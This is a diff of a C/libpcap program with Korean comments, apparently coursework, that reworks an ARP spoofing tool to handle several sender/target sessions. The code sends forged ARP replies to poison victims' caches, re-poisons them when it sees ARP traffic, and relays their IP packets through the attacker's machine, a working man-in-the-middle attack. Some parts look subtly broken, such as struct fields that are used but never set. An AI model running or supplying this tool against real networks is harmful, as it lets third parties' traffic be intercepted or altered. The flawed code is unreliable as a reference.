@@ -28,18 +28,35 @@ struct arp_header
     u_int8_t target_mac[6];        //Target MAC address
     u_int8_t target_ip[4];        //Target IP address
 };
-struct arp2_header
+struct ip_header{
+    uint8_t ver;
+    uint8_t type;
+    uint16_t len;
+    uint16_t ident;
+    uint16_t flag;
+    uint8_t ttl;
+    uint8_t proc;
+    uint16_t chec;
+    uint8_t src_ip[4];
+    uint8_t dst_ip[4];
+};
+struct packet
 {
     struct ethernet_header eth;    //arp 구조체와 한번에 이어서 쓰기 위하여 ethernet 구조체를 가져옴
-    u_int16_t hard_type;        //hardware type -- ethernet(1)
-    u_int16_t proc_type;        //protocol type -- ARP(0x0806)
-    u_int8_t hard_len;        //Hardware size -- 6
-    u_int8_t proc_len;        //Protocol size -- 4
-    u_int16_t oper;            //Opcode -- request(1) , reply(2)
+    struct arp_header arp;
+};
+struct packet2
+{
+    struct ethernet_header eth;    //arp 구조체와 한번에 이어서 쓰기 위하여 ethernet 구조체를 가져옴
+    struct ip_header ip;
+};
+
+struct session
+{
     u_int8_t sender_mac[6];        //Sender MAC address
     u_int8_t sender_ip[4];        //Sender IP address
     u_int8_t target_mac[6];        //Target MAC address
-    u_int8_t target_ip[4];        //Target IP address
+    u_int8_t target_ip[4];
 };
 
 void usage() {
@@ -67,6 +84,138 @@ int my_dev(const char *dev, u_int8_t *mac)
     return rv;
 }
 
+void get_info(pcap_t *handle, u_int8_t *smac, u_int8_t *tmac,  u_int8_t *sip, u_int8_t* tip){
+    struct arp_header arp;
+
+    memcpy(arp.eth.dst, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+    memcpy(arp.eth.src,smac, 6);
+    arp.eth.type = (u_int16_t)ntohs(0x0806);
+    arp.hard_type = (u_int16_t)ntohs(0x0001);
+    arp.proc_type = (u_int16_t)ntohs(0x0800);
+    arp.hard_len = (u_int8_t)0x06;
+    arp.proc_len = (u_int8_t)0x04;
+    arp.oper = (u_int16_t)ntohs(0x0001);
+
+    memcpy(arp.target_mac,"\x00\x00\x00\x00\x00\x00",6);
+    memcpy(arp.sender_mac ,smac, 6);
+    memcpy(arp.target_ip ,tip, 4);
+    memcpy(arp.sender_ip ,sip, 4);
+    printf("========================================\n");
+    printf("SEND\n");
+    printf("ARP REQUEST-----------------------------\n");
+    printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.dst[0],arp.eth.dst[1],arp.eth.dst[2],arp.eth.dst[3],arp.eth.dst[4],arp.eth.dst[5]);
+    printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.src[0],arp.eth.src[1],arp.eth.src[2],arp.eth.src[3],arp.eth.src[4],arp.eth.src[5]);
+    printf("Ethernet Type \t: ARP (0x%04X)\n", (arp.eth.type<<8&0xFF00)|(arp.eth.type>>8&0x00FF));
+    printf("---\n");
+    printf("Hardware Type \t: Ethernet (%X)\n", arp.hard_type>>8);
+    printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp.proc_type<<8 & 0xFF00)|(arp.proc_type>>8 & 0x00FF));
+    printf("Hardware Length : %X\n", arp.hard_len);
+    printf("Protocol Length : %X\n", arp.proc_len);
+    printf("Opcode \t\t: Request(%X)\n", arp.oper>>8);
+    printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.sender_mac[0],arp.sender_mac[1],arp.sender_mac[2],arp.sender_mac[3],arp.sender_mac[4],arp.sender_mac[5]);
+    printf("Sender IP \t: %u.%u.%u.%u\n", arp.sender_ip[0],arp.sender_ip[1],arp.sender_ip[2],arp.sender_ip[3]);
+    printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.target_mac[0],arp.target_mac[1],arp.target_mac[2],arp.target_mac[3],arp.target_mac[4],arp.target_mac[5]);
+    printf("Target IP \t: %u.%u.%u.%u\n", arp.target_ip[0],arp.target_ip[1],arp.target_ip[2],arp.target_ip[3]);
+    printf("========================================\n\n");
+
+
+    pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
+
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+
+        struct arp_header * arp_msg = (arp_header *)packet;		//arp_header 구조체 가져와서 arp_msg 만들고 패킷을 가져옴
+        if(ntohs(arp_msg->oper) == 0x0002){				//ARP reply 일때
+            int i;
+            for(i=0; i<4 ; i++){
+                if(arp_msg->sender_ip[i] != tip[i])			//sender_ip와 tar_ip가 같지 않을 때 arp msg를 넣고 break;
+                    break;
+            }
+            if(i==4){
+                for(int i=0; i<6; i++){
+                    tmac[i] = arp_msg->sender_mac[i];        //arg_msg를 sender_mac에 넣고 tar_mac에 저장
+
+                }
+                break;
+            }
+        }
+    }
+
+}
+
+void reply(pcap_t *handle, u_int8_t *smac, u_int8_t *tmac, u_int8_t *sip, u_int8_t* tip){
+    struct arp_header arp;
+    memcpy(arp.eth.dst, tmac, 6);
+    memcpy(arp.eth.src,smac, 6);
+    arp.eth.type = (u_int16_t)ntohs(0x0806);
+    arp.hard_type = (u_int16_t)ntohs(0x0001);
+    arp.proc_type = (u_int16_t)ntohs(0x0800);
+    arp.hard_len = (u_int8_t)0x06;
+    arp.proc_len = (u_int8_t)0x04;
+    arp.oper = (u_int16_t)ntohs(0x0002);
+
+    memcpy(arp.target_mac,tmac,6);
+    memcpy(arp.sender_mac ,smac, 6);
+    memcpy(arp.target_ip ,tip, 4);
+    memcpy(arp.sender_ip ,sip, 4);
+
+    printf("SEND REPLY\n");
+    printf("ARP REPLY-------------------------------\n");
+    printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.dst[0],arp.eth.dst[1],arp.eth.dst[2],arp.eth.dst[3],arp.eth.dst[4],arp.eth.dst[5]);
+    printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.src[0],arp.eth.src[1],arp.eth.src[2],arp.eth.src[3],arp.eth.src[4],arp.eth.src[5]);
+    printf("Ethernet Type \t: ARP (0x%04X)\n", (arp.eth.type<<8&0xFF00)|(arp.eth.type>>8&0x00FF));
+    printf("---\n");
+    printf("Hardware Type \t: Ethernet (%X)\n", arp.hard_type>>8);
+    printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp.proc_type<<8 & 0xFF00)|(arp.proc_type>>8 & 0x00FF));
+    printf("Hardware Length : %X\n", arp.hard_len);
+    printf("Protocol Length : %X\n", arp.proc_len);
+    printf("Opcode \t\t: Request(%X)\n", arp.oper>>8);
+    printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.sender_mac[0],arp.sender_mac[1],arp.sender_mac[2],arp.sender_mac[3],arp.sender_mac[4],arp.sender_mac[5]);
+    printf("Sender IP \t: %u.%u.%u.%u\n", arp.sender_ip[0],arp.sender_ip[1],arp.sender_ip[2],arp.sender_ip[3]);
+    printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.target_mac[0],arp.target_mac[1],arp.target_mac[2],arp.target_mac[3],arp.target_mac[4],arp.target_mac[5]);
+    printf("Target IP \t: %u.%u.%u.%u\n", arp.target_ip[0],arp.target_ip[1],arp.target_ip[2],arp.target_ip[3]);
+    printf("========================================\n");
+
+    pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
+
+}
+
+bool chk_arp(const u_char* packet, uint8_t* mac){
+    struct arp_header arp;
+    int type;
+
+    memcpy(&arp.eth, packet, 14);
+    type = (arp.eth.type<<8&0xFF00)|(arp.eth.type>>8&0x00FF);
+    if(type == 0x0806) {
+        if(!memcmp(arp.eth.dst, mac, 6) || !memcmp(arp.eth.dst, "\xff\xff\xff\xff\xff\xff", 6)) return true;
+    }
+    return false;
+}
+
+bool chk(const u_char* packet, session sess){
+    struct arp_header arp;
+    struct ip_header ip;
+    int type;
+
+    memcpy(&arp.eth, packet, 14);
+    memcpy(&ip, packet+14, 20);
+    type = (arp.proc_type<<8 & 0xFF00)|(arp.proc_type>>8 & 0x00FF);
+    if(type == 0x0800) {
+    if(!memcmp(arp.eth.src, sess.sender_mac, 6) && !memcmp(arp.eth.dst, sess.target_mac, 6)) return true;
+    }
+    return false;
+}
+
+void relay(const u_char *pack, u_int8_t *mac, session sess){
+    struct packet2 *packet = (packet2*)pack;
+    memcpy(packet->eth.src, mac, 6);
+    memcpy(packet->eth.dst, sess.target_mac, 6);
+}
+
 
 void char_int(char* char_ip, u_int8_t* ip){
     char* ip1=strtok(char_ip,".");            //맨처음 ./ARPSpoofing ens33 ip ip 하면서 받아온 인자 값들을 문자형에서 정수형으로 변환
@@ -80,292 +229,62 @@ void char_int(char* char_ip, u_int8_t* ip){
 }
 
 int main(int argc, char* argv[]) {
-    struct arp_header arp;        //구조체 불러옴
-    struct arp2_header arp2;
-
-    u_int8_t send_ip[4];        //sender의 ip
-    u_int8_t send_mac[6];
-    u_int8_t tar_ip[4];        //target의 ip
-    u_int8_t tar_mac[6];        //target의 mac
-    u_int8_t send2_ip[4];        //sender의 ip
-    u_int8_t send2_mac[6];
-    u_int8_t tar2_ip[4];        //target의 ip
-    u_int8_t tar2_mac[6];        //target의 mac
-
-    struct pcap_pkthdr* header;
-    const u_char* packet;
-
     if (argc < 4) {
-        usage();            //인자값을 6개 못받아오면 위의 usage 실행
+        usage();
         return -1;
     }
     if ((argc-2)%2 != 0) {
-        printf("Try Again.");
+        printf("Try Again...\n");
         return -1;
     }
-    char* dev = argv[1];        //1번째 인자값 --> ens33
-    char_int(argv[2], send_ip);        //2번째 인자값 --> char로 받아온 send_ip를 int값으로 변환함
-    char_int(argv[3], tar_ip);        //3번째 인자값 --> char로 받아온 tar_ip를 int값으로 변환함
-    char_int(argv[4], send2_ip);
-    char_int(argv[5], tar2_ip);
+    char* dev = argv[1];
+
+    u_int8_t *src_mac=(u_int8_t*)malloc(sizeof(u_int8_t)*6);        //src_mac을 선언, malloc으로 크기를 동적으로 할당해줌
+    my_dev(dev,src_mac);
+
+
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == NULL) {
         fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
         return -1;
     }
+           //1번째 인자값 --> ens33
 
-    while(true){
-        int num;
-        printf("1. MY MAC\n");
-        printf("2. ARP Spoofing\n");
-        printf("3. exit\n");
-        printf("  Select Number : ");
-        scanf("%d",&num);
+    int sess_num=(argc-2)/2;
+    session* sess = new session[sess_num];
+    for (int i=0; i<sess_num; i++){
+        inet_aton(argv[2+2*i], (in_addr*)sess[i].sender_ip);
+        inet_aton(argv[3+2*i], (in_addr*)sess[i].target_ip);
+        get_info(handle, src_mac, sess[i].sender_mac, sess[i].sender_ip, sess[i].target_ip);
+        //get_info(handle, src_mac, sess[i].target_mac, sess[i].target_ip, sess[i].sender_ip);
+    }
+    for (int i=0; i<sess_num; i++){
+        reply(handle, src_mac, sess[i].sender_mac, sess[i].sender_ip, sess[i].target_ip);
+        //reply(handle, src_mac, sess[i].target_mac, sess[i].target_ip, sess[i].sender_ip);
+    }
 
-        if(num==1){
-            u_int8_t *src_mac=(u_int8_t*)malloc(sizeof(u_int8_t)*6);        //src_mac을 선언, malloc으로 크기를 동적으로 할당해줌
-            my_dev(dev,src_mac);
-            printf("  Waiting ...\n");
-            int res = pcap_next_ex(handle, &header, &packet);
-            if (res == 0) continue;
-            if (res == -1 || res == -2) break;
-            printf("  Source MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]);
-            //나의 device에서 mac 주소를 가져옴
-        }
-
-        else if(num==2){
-            u_int8_t *src_mac=(u_int8_t*)malloc(sizeof(u_int8_t)*6);        //src_mac을 선언, malloc으로 크기를 동적으로 할당해줌
-            my_dev(dev,src_mac);
-            memcpy((char*)arp.eth.dst, "\xff\xff\xff\xff\xff\xff", 6);
-                //ff:ff:ff:ff:ff:ff -> 6바이트를 arp.eth.dst에 복사
-            memcpy((char*)arp2.eth.dst, "\xff\xff\xff\xff\xff\xff", 6);
-            for(int i=0; i<6; i++){
-                arp.eth.src[i] = src_mac[i];
-                arp2.eth.src[i] = src_mac[i];
-
-            }    //내 mac 주소를 출력 (mac은 6자리니까 for문으로 6번 돌림)
-            arp.eth.type = (u_int16_t)ntohs(0x0806);
-                //0806->ARP    network byte 순서를 to host byte 순서로 바꾸어준다.
-                //뒤의 s는 short로 2바이트 변수에 대해 바이트 순서를 변경해준다.
-            arp.hard_type = (u_int16_t)ntohs(0x0001);
-                //0x0001 -> Ethernet
-            arp.proc_type = (u_int16_t)ntohs(0x0800);
-                //0x0800 -> IPv4
-            arp.hard_len = (u_int8_t)0x06;
-                //0x06 -> Hardware size
-            arp.proc_len = (u_int8_t)0x04;
-                //0x04 -> Protocol size
-            arp.oper = (u_int16_t)ntohs(0x0001);
-                //Request = 1, Reply = 2
-            arp2.eth.type = (u_int16_t)ntohs(0x0806);
-                //0806->ARP    network byte 순서를 to host byte 순서로 바꾸어준다.
-                //뒤의 s는 short로 2바이트 변수에 대해 바이트 순서를 변경해준다.
-            arp2.hard_type = (u_int16_t)ntohs(0x0001);
-                //0x0001 -> Ethernet
-            arp2.proc_type = (u_int16_t)ntohs(0x0800);
-                //0x0800 -> IPv4
-            arp2.hard_len = (u_int8_t)0x06;
-                //0x06 -> Hardware size
-            arp2.proc_len = (u_int8_t)0x04;
-                //0x04 -> Protocol size
-            arp2.oper = (u_int16_t)ntohs(0x0001);
-                //Request = 1, Reply = 2
-
-            for(int i=0; i<6; i++){
-                arp.sender_mac[i] = src_mac[i];
-                arp2.sender_mac[i] = src_mac[i];
-            }    //나의 mac 주소를 sender mac에 집어넣음
-
-            for(int i=0; i<4; i++){
-                arp.sender_ip[i] = send_ip[i];
-                arp2.sender_ip[i] = send2_ip[i];
-            }    //나의 ip를 sender ip에 집어넣음
-            memcpy((char*)arp.target_mac,"\x00\x00\x00\x00\x00\x00",6);
-                //상대방의 MAC 주소를 모르는 상태이므로 MAC주소 지정하지 않고 모두 0으로 채워서
-                //LAN 전체에 브로드캐스트, 00:00:00:00:00:00의 6바이트를 target mac 에 복사
-            memcpy((char*)arp2.target_mac,"\x00\x00\x00\x00\x00\x00",6);
-            for(int i=0; i<4; i++){
-                arp.target_ip[i] = tar_ip[i];
-                arp2.target_ip[i] = tar2_ip[i];
-            }    //tar_ip를 구조체의 arp.target_ip에 저장
-
-
-            printf("========================================\n");
-            printf("SEND\n");
-            printf("ARP REQUEST-----------------------------\n");
-            printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.dst[0],arp.eth.dst[1],arp.eth.dst[2],arp.eth.dst[3],arp.eth.dst[4],arp.eth.dst[5]);
-            printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.src[0],arp.eth.src[1],arp.eth.src[2],arp.eth.src[3],arp.eth.src[4],arp.eth.src[5]);
-            printf("Ethernet Type \t: ARP (0x%04X)\n", (arp.eth.type<<8 & 0xFF00)|(arp.eth.type>>8 & 0x00FF));
-            printf("---\n");
-            printf("Hardware Type \t: Ethernet (%X)\n", arp.hard_type>>8);
-            printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp.proc_type<<8 & 0xFF00)|(arp.proc_type>>8 & 0x00FF));
-            printf("Hardware Length : %X\n", arp.hard_len);
-            printf("Protocol Length : %X\n", arp.proc_len);
-            printf("Opcode \t\t: Request(%X)\n", arp.oper>>8);
-            printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.sender_mac[0],arp.sender_mac[1],arp.sender_mac[2],arp.sender_mac[3],arp.sender_mac[4],arp.sender_mac[5]);
-            printf("Sender IP \t: %u.%u.%u.%u\n", arp.sender_ip[0],arp.sender_ip[1],arp.sender_ip[2],arp.sender_ip[3]);
-            printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.target_mac[0],arp.target_mac[1],arp.target_mac[2],arp.target_mac[3],arp.target_mac[4],arp.target_mac[5]);
-            printf("Target IP \t: %u.%u.%u.%u\n", arp.target_ip[0],arp.target_ip[1],arp.target_ip[2],arp.target_ip[3]);
-            printf("========================================\n\n");
-
-            pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));
-                 //eth와 arp 구조체를 합한 길이만큼의 패킷을 보내는데 OPCode가 1이므로 Request인 패킷 보냄
-
-            printf("========================================\n");
-            printf("SEND222222222222222222\n");
-            printf("ARP REQUEST-----------------------------\n");
-            printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp2.eth.dst[0],arp2.eth.dst[1],arp2.eth.dst[2],arp2.eth.dst[3],arp2.eth.dst[4],arp2.eth.dst[5]);
-            printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp2.eth.src[0],arp2.eth.src[1],arp2.eth.src[2],arp2.eth.src[3],arp2.eth.src[4],arp2.eth.src[5]);
-            printf("Ethernet Type \t: ARP (0x%04X)\n", (arp2.eth.type<<8 & 0xFF00)|(arp2.eth.type>>8 & 0x00FF));
-            printf("---\n");
-            printf("Hardware Type \t: Ethernet (%X)\n", arp2.hard_type>>8);
-            printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp2.proc_type<<8 & 0xFF00)|(arp2.proc_type>>8 & 0x00FF));
-            printf("Hardware Length : %X\n", arp2.hard_len);
-            printf("Protocol Length : %X\n", arp2.proc_len);
-            printf("Opcode \t\t: Request(%X)\n", arp2.oper>>8);
-            printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp2.sender_mac[0],arp2.sender_mac[1],arp2.sender_mac[2],arp2.sender_mac[3],arp2.sender_mac[4],arp2.sender_mac[5]);
-            printf("Sender IP \t: %u.%u.%u.%u\n", arp2.sender_ip[0],arp2.sender_ip[1],arp2.sender_ip[2],arp2.sender_ip[3]);
-            printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp2.target_mac[0],arp2.target_mac[1],arp2.target_mac[2],arp2.target_mac[3],arp2.target_mac[4],arp2.target_mac[5]);
-            printf("Target IP \t: %u.%u.%u.%u\n", arp2.target_ip[0],arp2.target_ip[1],arp2.target_ip[2],arp2.target_ip[3]);
-            printf("========================================\n\n");
-
-            pcap_sendpacket(handle,(u_char*)&arp2, sizeof(arp2));
-
-            while (true) {
-                int res = pcap_next_ex(handle, &header, &packet);
-                if (res == 0) continue;
-                if (res == -1 || res == -2) break;
-
-                struct arp_header * arp_msg = (arp_header *)packet;		//arp_header 구조체 가져와서 arp_msg 만들고 패킷을 가져옴
-                if(ntohs(arp_msg->oper) == 0x0002){				//ARP reply 일때
-                    int i;
-                    for(i=0; i<4 ; i++){
-                        if(arp_msg->sender_ip[i] != tar_ip[i])			//sender_ip와 tar_ip가 같지 않을 때 arp msg를 넣고 break;
-                            break;
-                    }
-                    if(i==4){
-                        for(int i=0; i<6; i++){
-                            tar_mac[i] = arp_msg->sender_mac[i];        //arg_msg를 sender_mac에 넣고 tar_mac에 저장
-
-                        }
-                        break;
-                    }
-                }
-            }
-            while (true) {
-                int res = pcap_next_ex(handle, &header, &packet);
-                if (res == 0) continue;
-                if (res == -1 || res == -2) break;
-
-                struct arp2_header * arp2_msg = (arp2_header *)packet;		//arp_header 구조체 가져와서 arp_msg 만들고 패킷을 가져옴
-                if(ntohs(arp2_msg->oper) == 0x0002){				//ARP reply 일때
-                    int i;
-                    for(i=0; i<4 ; i++){
-                        if(arp2_msg->sender_ip[i] != tar2_ip[i])			//sender_ip와 tar_ip가 같지 않을 때 arp msg를 넣고 break;
-                            break;
-                    }
-                    if(i==4){
-                        for(int i=0; i<6; i++){
-                            tar2_mac[i] = arp2_msg->sender_mac[i];        //arg_msg를 sender_mac에 넣고 tar_mac에 저장
-
-                        }
-                        break;
-                    }
-                }
-            }
-
-            //-----------------------------------
-            for(int i=0; i<6; i++){
-                arp.eth.dst[i] = tar_mac[i];
-                arp2.eth.dst[i] = tar2_mac[i];
-            }    //tar_mac을 arp.eth.dst에 넣음
-            for(int i=0; i<6; i++){
-                arp.eth.src[i] = src_mac[i];
-                arp2.eth.src[i] = src_mac[i];
-            }    //my_mac을 arp.eth.src에 넣음
-            arp.eth.type = (u_int16_t)ntohs(0x0806);
-                //ethernet type이 0x0806 = ARP이다.
-            arp.hard_type = (u_int16_t)ntohs(0x0001);
-                //hardware type이 0x0001 = ethernet을 사용한다. (데이터링크 계층의 프로토콜 종류를 지정하는 2바이트 필드)
-            arp.proc_type = (u_int16_t)ntohs(0x0800);
-                //protocol type이 0x0800 = IPv4이다. (네트워크 계층의 프로토콜이 2바이트로 지정된다.)
-            arp.hard_len = (u_int8_t)0x06;
-                //데이터링크 계층의 주소 크기 나타내는 필드 (MAC 주소의 크기인 6이 지정)
-            arp.proc_len = (u_int8_t)0x04;
-                //네트워크 계층의 프로토콜 주소 크기 (IP 주소의 크기인 4 가 지정)
-            arp.oper = (u_int16_t)ntohs(0x0002);
-                //Opcode = 2바이트 필드, ARP로 수행하는 작업의 종류 지정
-            arp2.eth.type = (u_int16_t)ntohs(0x0806);
-                //ethernet type이 0x0806 = ARP이다.
-            arp2.hard_type = (u_int16_t)ntohs(0x0001);
-                //hardware type이 0x0001 = ethernet을 사용한다. (데이터링크 계층의 프로토콜 종류를 지정하는 2바이트 필드)
-            arp2.proc_type = (u_int16_t)ntohs(0x0800);
-                //protocol type이 0x0800 = IPv4이다. (네트워크 계층의 프로토콜이 2바이트로 지정된다.)
-            arp2.hard_len = (u_int8_t)0x06;
-                //데이터링크 계층의 주소 크기 나타내는 필드 (MAC 주소의 크기인 6이 지정)
-            arp2.proc_len = (u_int8_t)0x04;
-                //네트워크 계층의 프로토콜 주소 크기 (IP 주소의 크기인 4 가 지정)
-            arp2.oper = (u_int16_t)ntohs(0x0002);
-            for(int i=0; i<6; i++){
-                arp.sender_mac[i] = src_mac[i];
-                arp2.sender_mac[i] = src_mac[i];
-            }    //my_mac을 arp.sender_mac에 넣음
-            for(int i=0; i<4; i++){
-                arp.sender_ip[i] = send_ip[i];
-                arp2.sender_ip[i] = send2_ip[i];
-            }    //보내고 싶은 ip를 arp.sender_ip에 넣음
-            memcpy((char*)arp.target_mac, tar_mac,6);
-                //tar_mac 6바이트를 arp.target_mac에 저장
-            memcpy((char*)arp2.target_mac, tar2_mac,6);
-            for(int i=0; i<4; i++){
-                arp.target_ip[i] = tar_ip[i];
-                arp2.target_ip[i] = tar2_ip[i];
-            }    //공격할 ip를 arp.target_ip에 넣음
-
-            printf("SEND REPLY\n");
-            printf("ARP REPLY-------------------------------\n");
-            printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.dst[0],arp.eth.dst[1],arp.eth.dst[2],arp.eth.dst[3],arp.eth.dst[4],arp.eth.dst[5]);
-            printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp.eth.src[0],arp.eth.src[1],arp.eth.src[2],arp.eth.src[3],arp.eth.src[4],arp.eth.src[5]);
-            printf("Ethernet Type \t: ARP (0x%04X)\n", (arp.eth.type<<8 & 0xFF00)|(arp.eth.type>>8 & 0x00FF));
-            printf("---\n");
-            printf("Hardware Type \t: Ethernet (%X)\n", arp.hard_type>>8);
-            printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp.proc_type<<8 & 0xFF00)|(arp.proc_type>>8 & 0x00FF));
-            printf("Hardware Length : %X\n", arp.hard_len);
-            printf("Protocol Length : %X\n", arp.proc_len);
-            printf("Opcode \t\t: arply (%X)\n", arp.oper>>8);
-            printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.sender_mac[0],arp.sender_mac[1],arp.sender_mac[2],arp.sender_mac[3],arp.sender_mac[4],arp.sender_mac[5]);
-            printf("Sender IP \t: %u.%u.%u.%u\n", arp.sender_ip[0],arp.sender_ip[1],arp.sender_ip[2],arp.sender_ip[3]);
-            printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp.target_mac[0],arp.target_mac[1],arp.target_mac[2],arp.target_mac[3],arp.target_mac[4],arp.target_mac[5]);
-            printf("Target IP \t: %u.%u.%u.%u\n", arp.target_ip[0],arp.target_ip[1],arp.target_ip[2],arp.target_ip[3]);
-            printf("========================================\n");
-
-            printf("222222222222\n");
-            printf("ARP REPLY-------------------------------\n");
-            printf("Ethernet Dest \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp2.eth.dst[0],arp2.eth.dst[1],arp2.eth.dst[2],arp2.eth.dst[3],arp2.eth.dst[4],arp2.eth.dst[5]);
-            printf("Ethernet Source : %02X-%02X-%02X-%02X-%02X-%02X\n", arp2.eth.src[0],arp2.eth.src[1],arp2.eth.src[2],arp2.eth.src[3],arp2.eth.src[4],arp2.eth.src[5]);
-            printf("Ethernet Type \t: ARP (0x%04X)\n", (arp2.eth.type<<8 & 0xFF00)|(arp2.eth.type>>8 & 0x00FF));
-            printf("---\n");
-            printf("Hardware Type \t: Ethernet (%X)\n", arp2.hard_type>>8);
-            printf("Protocol Type \t: IPv4 (0x%04X)\n", (arp2.proc_type<<8 & 0xFF00)|(arp2.proc_type>>8 & 0x00FF));
-            printf("Hardware Length : %X\n", arp2.hard_len);
-            printf("Protocol Length : %X\n", arp2.proc_len);
-            printf("Opcode \t\t: arply (%X)\n", arp2.oper>>8);
-            printf("Sender MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp2.sender_mac[0],arp2.sender_mac[1],arp2.sender_mac[2],arp2.sender_mac[3],arp2.sender_mac[4],arp2.sender_mac[5]);
-            printf("Sender IP \t: %u.%u.%u.%u\n", arp2.sender_ip[0],arp2.sender_ip[1],arp2.sender_ip[2],arp2.sender_ip[3]);
-            printf("Target MAC \t: %02X-%02X-%02X-%02X-%02X-%02X\n", arp2.target_mac[0],arp2.target_mac[1],arp2.target_mac[2],arp2.target_mac[3],arp2.target_mac[4],arp2.target_mac[5]);
-            printf("Target IP \t: %u.%u.%u.%u\n", arp2.target_ip[0],arp2.target_ip[1],arp2.target_ip[2],arp2.target_ip[3]);
-            printf("========================================\n");
-            while(true){
-                pcap_sendpacket(handle,(u_char*)&arp, sizeof(arp));            //무한으로 패킷 보냄
-                pcap_sendpacket(handle,(u_char*)&arp2, sizeof(arp2));
-                sleep(1);
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+        for (int i=0; i<sess_num; i++){
+            if(chk_arp(packet, sess[i].sender_mac)){
+                reply(handle, src_mac, sess[i].sender_mac, sess[i].sender_ip, sess[i].target_ip);                continue;
             }
         }
-        else{
-            exit(0);
+        for (int i=0; i<sess_num; i++){
+            if(chk(packet, sess[i])){
+                relay(packet, src_mac, sess[i]);
+                pcap_sendpacket(handle, packet, header->caplen);
+            }
         }
     }
+
+
+
     pcap_close(handle);
 
     return 0;
